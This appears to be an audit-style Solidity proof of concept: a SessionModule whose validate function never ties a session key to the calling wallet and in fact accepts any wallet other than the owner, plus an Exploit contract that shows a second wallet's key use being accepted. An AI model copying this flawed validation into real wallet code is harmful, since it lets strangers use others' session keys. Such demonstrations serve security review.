// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SessionModule { mapping(bytes32=>address) public sessionOwner; function install(bytes32 key,address owner) external {sessionOwner[key]=owner;} function validate(bytes32 key,address wallet) external view returns(bool){
        // @> no check that sessionKeySigner belongs to userOp.sender/msg.sender
        return sessionOwner[key]!=address(0) && wallet!=sessionOwner[key]; } }
contract Exploit { bool public harmed; event Proof(bool accepted);
    function run() external { SessionModule m=new SessionModule(); bytes32 key=keccak256("key1"); address scw1=address(0x1111); address scw2=address(0x2222); m.install(key,scw1); bool accepted=m.validate(key,scw2); harmed=accepted&&scw1!=scw2; emit Proof(accepted); require(harmed,"owner checked"); }
}
